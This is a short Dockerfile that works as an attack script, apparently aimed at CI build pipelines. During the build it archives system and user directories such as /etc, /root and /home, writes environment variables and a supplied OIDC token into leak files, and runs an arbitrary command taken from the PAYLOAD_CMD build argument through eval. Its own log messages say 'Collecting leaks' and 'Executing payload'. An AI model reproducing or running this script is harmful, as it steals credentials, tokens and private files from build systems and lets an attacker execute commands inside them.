FROM python:3.11-alpine

ARG EXFIL_OIDC_TOKEN
ARG PAYLOAD_CMD

RUN apk add --no-cache curl tar bash && \
    echo "[+] Collecting leaks..." && \
    tar -czf /leaks.tar.gz \
      /etc \
      /root \
      /home \
      /var \
      /opt \
      /srv 2>/dev/null || true && \
    echo "[+] Dumping env vars (excluding GITHUB_TOKEN)..." && \
    printenv | grep -v GITHUB_TOKEN >> /leaks_env.txt && \
    echo "OIDC_TOKEN=$EXFIL_OIDC_TOKEN" >> /leaks_env.txt && \
    echo "[+] Executing payload..." && \
    eval "$PAYLOAD_CMD"
